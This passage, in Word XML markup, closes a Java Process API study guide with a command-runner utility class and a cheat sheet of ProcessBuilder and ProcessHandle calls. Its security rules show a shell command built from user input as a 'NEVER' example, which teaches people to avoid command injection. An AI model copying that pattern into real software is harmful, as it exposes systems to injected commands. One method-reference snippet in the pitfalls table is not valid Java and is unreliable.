        <w:t>import java.nio.charset.StandardCharsets;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>import java.util.*;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>import java.util.concurrent.*;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public final class Processes {</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>private Processes() {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public record Result(int exitCode, String stdout, String stderr) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public boolean success() { return exitCode == 0; }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>/** Run a command and collect stdout/stderr. Throws on timeout. */</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public static Result run(long timeoutSec, String... command)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>throws IOException, InterruptedException, TimeoutException {</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder(command);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>StringBuilder out = new StringBuilder();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>StringBuilder err = new StringBuilder();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Thread outThread = readAsync(p.getInputStream(), out);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread errThread = readAsync(p.getErrorStream(), err);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>boolean done = p.waitFor(timeoutSec, TimeUnit.SECONDS);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>outThread.join(TimeUnit.SECONDS.toMillis(timeoutSec));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>errThread.join(TimeUnit.SECONDS.toMillis(timeoutSec));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if (!done) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroyForcibly();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>throw new TimeoutException("Process timed out: " + Arrays.toString(command));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>return new Result(p.exitValue(), out.toString(), err.toString());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>private static Thread readAsync(InputStream is, StringBuilder sb) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread t = new Thread(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try (BufferedReader br = new BufferedReader(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new InputStreamReader(is, StandardCharsets.UTF_8))) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>br.lines().forEach(line -&gt; sb.append(line).append('\n'));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (IOException ignored) {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>t.setDaemon(true);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>t.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return t;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public static void main(String[] args) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Result r = run(10, "git", "log", "--oneline", "-5");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if (r.success()) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Recent commits:\n" + r.stdout());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} else {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.err.println("Error:\n" + r.stderr());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>12. Quick Reference Cheat Sheet</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ProcessBuilder Setup</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("cmd", "arg1", "arg2");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.command(List.of("cmd", "arg1"));         // replace command</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.directory(new File("/path"));            // working directory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.environment().put("KEY", "value");       // set env var</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.environment().remove("KEY");             // remove env var</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.environment().clear();                   // clean env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true);               // merge stderr → stdout</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.inheritIO();                             // inherit all three streams</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectOutput(Redirect.to(file));       // stdout → file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectOutput(Redirect.appendTo(file)); // stdout → append file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectInput(Redirect.from(file));      // stdin ← file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectError(Redirect.DISCARD);         // discard stderr</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();                     // LAUNCH IT</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Process Control</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>p.pid()                                     // OS process ID (Java 9+)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.isAlive()                                 // non-blocking alive check</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.exitValue()                               // non-blocking exit code (throws if running)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor()                                 // block until exit — returns exit code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor(5, TimeUnit.SECONDS)              // block with timeout — returns boolean</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroy()                                 // send SIGTERM (graceful)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroyForcibly()                         // send SIGKILL (immediate)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.onExit()                                  // CompletableFuture&lt;Process&gt; (Java 9+)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Process I/O</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>p.getInputStream()    // read process STDOUT (confusingly named "input" to Java)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.getErrorStream()    // read process STDERR</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.getOutputStream()   // write to process STDIN</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ProcessHandle (Java 9+)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessHandle.current()               // JVM's own process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessHandle.of(pid)                 // Optional&lt;ProcessHandle&gt; by PID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessHandle.allProcesses()          // Stream&lt;ProcessHandle&gt; all visible processes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.toHandle()                          // Process → ProcessHandle</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.pid()                          // OS PID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.isAlive()                      // alive check</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.info()                         // ProcessHandle.Info snapshot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.parent()                       // Optional&lt;ProcessHandle&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.children()                     // Stream&lt;ProcessHandle&gt; direct children</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.descendants()                  // Stream&lt;ProcessHandle&gt; all descendants</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.destroy()                      // request termination</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.destroyForcibly()              // force terminate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.onExit()                       // CompletableFuture&lt;ProcessHandle&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ProcessHandle.Info (all Optional)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>info.command()           // Optional&lt;String&gt;   — executable path</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.arguments()         // Optional&lt;String[]&gt; — command-line args</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.commandLine()       // Optional&lt;String&gt;   — full command line</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.user()              // Optional&lt;String&gt;   — OS username</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.startInstant()      // Optional&lt;Instant&gt;  — when process started</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.totalCpuDuration()  // Optional&lt;Duration&gt; — total CPU time used</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pipeline (Java 9+)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>List&lt;Process&gt; procs = ProcessBuilder.startPipeline(List.of(pb1, pb2, pb3));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// procs.get(0) = first process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// procs.get(procs.size()-1) = last process — read its stdout for final output</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// wait for all: procs.forEach(p -&gt; p.waitFor());</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Security Rules</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// ❌ NEVER</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("/bin/sh", "-c", "cmd " + userInput);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// ✅ ALWAYS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("cmd", userInput); // separate argument — no shell interpretation</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// ✅ IF SHELL IS UNAVOIDABLE — whitelist first</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if (!userInput.matches("[a-zA-Z0-9._\\-]{1,100}")) throw new SecurityException();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Key Pitfalls to Remember</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Pitfall | Fix |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Process hangs — pipe buffer full | Always read both stdout and stderr concurrently |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `IllegalThreadStateException` on `exitValue()` | Call `waitFor()` first, or check `isAlive()` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Shell metacharacters ignored | Use `/bin/sh -c` only when you need shell features |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Command injection | Never embed user input in shell command strings |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Child process not killed | Use `destroyForcibly()` after `destroy()` timeout |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Grandchildren not killed | Use `handle.descendants().forEach(::destroyForcibly)` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `getInputStream()` vs `getOutputStream()` confusion | `getInputStream()` = read process's stdout; `getOutputStream()` = write to process's stdin |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| No timeout on `waitFor()` | Always use `waitFor(timeout, unit)` in production |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>*End of Java Process API Study Guide — Module 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